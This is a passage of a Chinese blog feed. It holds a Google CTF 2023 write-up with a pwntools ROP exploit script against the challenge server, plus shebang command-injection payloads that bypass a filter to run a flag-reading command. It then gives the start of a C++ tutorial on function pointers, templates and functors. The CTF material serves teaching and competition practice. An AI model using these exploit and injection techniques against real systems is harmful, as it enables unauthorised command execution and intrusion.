class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment"># p=process(&#x27;./main&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment"># exit(1)</span></span><br><span class="line">sh=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x555555555478</span></span><br><span class="line"><span class="string">b *0x555555555491</span></span><br><span class="line"><span class="string">b exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./chal&quot;)</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./chal&quot;,sh,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;wfw3.2023.ctfcompetition.com&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">addr,l</span>):</span><br><span class="line">    target = addr</span><br><span class="line">    pay = <span class="built_in">hex</span>(target).encode()+<span class="string">b&quot; &quot;</span>+<span class="built_in">str</span>(l).encode()</span><br><span class="line">    p.send(pay.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>(<span class="params">l</span>):</span><br><span class="line">    p.send(flat(l).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\xff&#x27;</span>))</span><br><span class="line">    p.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>(<span class="params">addr,l</span>):</span><br><span class="line">    <span class="keyword">if</span> l%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">        l=l-<span class="number">1</span></span><br><span class="line">        ch(addr+l-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l,<span class="number">2</span>):</span><br><span class="line">        ch(addr+x,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot; expire\n&quot;</span>)</span><br><span class="line">PIE = <span class="built_in">int</span>(p.readuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>],<span class="number">0x10</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(PIE))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ru(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.readuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>],<span class="number">0x10</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(base))</span><br><span class="line">ru(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x1b</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x17</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x2b</span>-<span class="number">3</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x2b</span>-<span class="number">2</span>+base,<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x1f</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x4</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x26</span>+base,<span class="number">1</span>)</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+base</span><br><span class="line">bprintf = <span class="number">0x555555555090</span>-<span class="number">0x555555554000</span>+PIE</span><br><span class="line">flag = <span class="number">0x5555555590A0</span>-<span class="number">0x555555554000</span>+PIE</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+base</span><br><span class="line">end([rdi,<span class="number">1337</span>,rsi,flag,bprintf,])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e2081c94cb03b32fa99c47d9a7d79102.png" alt="image-20230627020446490" /></p><p>得到flag</p><blockquote><p>CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}</p></blockquote><h2 id="storygen"><a class="markdownIt-Anchor" href="#storygen"></a> STORYGEN</h2><p>下载下来是python文件。</p><p>发现使用了<code>os.system(&quot;/tmp/script.sh&quot;)</code>，那么顺着逻辑去分析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#@NAME&#x27;s story</span></span><br><span class="line"></span><br><span class="line">NAME=<span class="string">&#x27;@NAME&#x27;</span></span><br><span class="line">WHERE=<span class="string">&#x27;@WHERE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$NAME</span> came from <span class="variable">$WHERE</span>. They always liked living there.&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;They had 3 pets:&quot;</span></span><br><span class="line"></span><br><span class="line">types[0]=<span class="string">&quot;dog&quot;</span></span><br><span class="line">types[1]=<span class="string">&quot;cat&quot;</span></span><br><span class="line">types[2]=<span class="string">&quot;fish&quot;</span></span><br><span class="line"></span><br><span class="line">names[0]=<span class="string">&quot;Bella&quot;</span></span><br><span class="line">names[1]=<span class="string">&quot;Max&quot;</span></span><br><span class="line">names[2]=<span class="string">&quot;Luna&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1 2 3</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  size1=<span class="variable">$&#123;#types[@]&#125;</span></span><br><span class="line">  index1=$((<span class="variable">$RANDOM</span> % <span class="variable">$size1</span>))</span><br><span class="line">  size2=<span class="variable">$&#123;#names[@]&#125;</span></span><br><span class="line">  index2=$((<span class="variable">$RANDOM</span> % <span class="variable">$size2</span>))</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;- a <span class="variable">$&#123;types[$index1]&#125;</span> named <span class="variable">$&#123;names[$index2]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Well, I&#x27;m not a good writer, you can write the rest... Hope this is a good starting point!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;If not, try running the script again.&quot;</span></span><br></pre></td></tr></table></figure><p>然后输入替换这段脚本</p><p><code>open(&quot;/tmp/script.sh&quot;, &quot;w&quot;).write(STORY.replace(&quot;@NAME&quot;, name).replace(&quot;@WHERE&quot;, where).strip())</code></p><p>不过存在小WAF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def sanitize(s):</span><br><span class="line">  return s.replace(&quot;&#x27;&quot;, &#x27;&#x27;).replace(&quot;\n&quot;, &quot;&quot;)</span><br></pre></td></tr></table></figure><p>首要思路肯定是命令注入，而且在首行的<code>#@NAME's story</code>自带了一个<code>'</code>，如果你对shell脚本比较了解的话，会知道往往是以<code>#!/bin/bash</code>开始的，尝试一下</p><p><img src="https://img.joe1sn.top/uploads/big/18571bac12cc614f607cd20862a46b1f.png" alt="image-20230627151715441" /></p><p>成功调用了<code>/bin/bash</code>。赛后看wp发现这个是Shebang（也称为Hashbang），是一种在Unix和类Unix系统中用于指定脚本解释器的约定，它是通过在脚本文件的第一行以特定格式指定解释器的路径来实现的，可以利用这种方式直接<code>./hello.py</code>，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4944fab6a0bb179de51e928c69c29c23.png" alt="image-20230627195529980" /></p><p><img src="https://img.joe1sn.top/uploads/big/96ed2e42f64be4acff42ad1b1e4a0432.png" alt="image-20230627195549157" /></p><p>那么开始构造exp，<strong>需要注意的是尽量使用\x00截断</strong></p><p>官方wp中介绍了一种技巧：<code>#!/bin/cat&lt;空格&gt;</code>的时候会读取自身脚本的内容，首先使用<code>ls -al</code>查看目录，最后排查到根目录</p><p><code>'!/usr/bin/env -S ls -al /\x00'</code></p><p><img src="https://img.joe1sn.top/uploads/big/70f72605e3119997fed33bbee578c2f6.png" alt="image-20230627202031628" /></p><p>尝试读取flag，出现提示</p><p><code>!/usr/bin/env -S cat /flag\x00</code></p><p><img src="https://img.joe1sn.top/uploads/big/c8ff5f5b46e27c6c5fb4070cde62e062.png" alt="image-20230627202132139" /></p><p>得到提示，最后使用payload得到flag</p><p><code>!/usr/bin/env -S sh -c &quot;/get_flag Give flag please&quot;\x00</code></p><p><img src="https://img.joe1sn.top/uploads/big/0656d0bf3c5b2b6e83166de03ceee2e1.png" alt="image-20230627202249168" /></p><blockquote><p>CTF{Sh3b4ng_1nj3cti0n_ftw}</p></blockquote><h2 id="ubf"><a class="markdownIt-Anchor" href="#ubf"></a> UBF</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。&lt;/p&gt;
&lt;p&gt;开始CTF的复健之路吧。&lt;/p&gt;</summary>
    
    
    
    <category term="writeup" scheme="https://joe1sn.eu.org/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://joe1sn.eu.org/tags/CTF/"/>
    
    <category term="writeup" scheme="https://joe1sn.eu.org/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】C++函数进化</title>
    <link href="https://joe1sn.eu.org/2023/06/26/cpp-function/"/>
    <id>https://joe1sn.eu.org/2023/06/26/cpp-function/</id>
    <published>2023-06-26T00:10:22.000Z</published>
    <updated>2023-06-26T15:41:34.611Z</updated>
    
    <content type="html"><![CDATA[<p>C++的函数进化小结</p><span id="more"></span><h1 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h1><p>有这样一个问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么很自然的给出解法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*start &gt; <span class="number">20</span>)</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>(IntArray,IntArray+<span class="number">20</span>)&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="函数指针"><a class="markdownIt-Anchor" href="#函数指针"></a> 函数指针</h1><p>这个时候的需要满足 <strong>统计大于10的数字</strong> 或者 <strong>统计小于35的数字</strong>，那么可以将<code>*start &gt; 20</code>这一段包装一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end, <span class="type">bool</span>(*ConditionFunc)(<span class="type">const</span> <span class="type">int</span> &amp;))</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat20</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">20</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat10</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">10</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bLess35</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123;  <span class="keyword">return</span> num &lt; <span class="number">35</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat20 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 10 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat10 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bLess35 )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图片上的代码有点小问题</p><p><img src="https://img.joe1sn.top/uploads/medium/6bd00d07f13d059ff7e733e80ecc0017.png" alt="image-20230626083232291" /></p><p>在c语言中可以这样写，虽然编译会有警告，但是仍然可以生成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">CountMatch</span><span class="params">(<span class="type">int</span>* start, <span class="type">int</span>* end, <span class="type">void</span> *function_pointer(<span class="type">int</span>))</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_pointer(*start))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pointer</span><span class="params">(<span class="type">int</span> start)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Happy\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Matches: %d\n&quot;</span>,CountMatch(IntArray,IntArray+<span class="number">20</span>, Pointer));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在c<ins>中伴随着指针的引用<code>*p</code>和解引用<code>&amp;p</code>，C</ins>对指针的类型安全性进行了更严格的限制。C++中的指针类型必须与所指向的对象类型匹配，不允许进行隐式类型转换。这可以帮助减少潜在的类型错误和编程错误。</p><h1 id="函数模板"><a class="markdownIt-Anchor" href="#函数模板"></a> 函数模板</h1><p>上面的函数只能支持<code>int</code>，使用函数模板能让他支持更多类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">CountMatch</span><span class="params">(T* start, T* end, <span class="type">bool</span>(*ConditionFunc)(<span class="type">const</span> T &amp;))</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; start &lt; end ; start++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ConditionFunc</span>(*start))</span><br><span class="line">                sum++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat20</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">20</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bGreat10</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123; <span class="keyword">return</span> num &gt; <span class="number">10</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bLess35</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;num)</span></span>&#123;  <span class="keyword">return</span> num &lt; <span class="number">35</span>; &#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bTiny</span><span class="params">(<span class="type">const</span> std::string &amp;val)</span></span>&#123; <span class="keyword">return</span> val.<span class="built_in">size</span>() &lt;= <span class="number">3</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray[] = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">38</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">15</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">12</span> &#125;;</span><br><span class="line">    std::string StrArray[] = &#123;<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;world&quot;</span>,<span class="string">&quot;This&quot;</span>,<span class="string">&quot;is&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;test&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">//统计大于20的数字</span></span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat20 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 10 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( IntArray, IntArray+<span class="number">20</span>, bGreat10 )&lt;&lt;std::endl;</span><br><span class="line">    std::cout&lt;&lt;<span class="string">&quot;Greater than 20 Matches: &quot;</span>&lt;&lt;<span class="built_in">CountMatch</span>( StrArray, StrArray+<span class="number">6</span>, bTiny )&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="仿函数"><a class="markdownIt-Anchor" href="#仿函数"></a> 仿函数</h1><p>在条件中如果需要处理用户传入的数字怎么办</p><p>仿函数（Functor）是C++中的一个概念，指的是可以像函数一样使用的对象。它实际上是一个类或结构体，重载了函数调用运算符 <code>operator()</code>，使得对象可以像函数一样进行调用操作。</p><p>chatGPT给了我这样一个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个仿函数类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddFunctor</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个仿函数对象</span></span><br><span class="line">    AddFunctor add;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用仿函数对象进行调用</span></span><br><span class="line">    <span class="type">int</span> result = <span class="built_in">add</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Result: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里可以这样写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Greater</span></span><br><span class="line">&#123;</span><br><span class="line">    T mVal; <span class="comment">//持有的状态</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Greater</span><span class="params">(T value)</span>:</span></span><br><span class="line"><span class="function">        mVal(value)&#123;</span>&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T &amp;val)</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> val&gt;mVal; &#125;</span><br><span 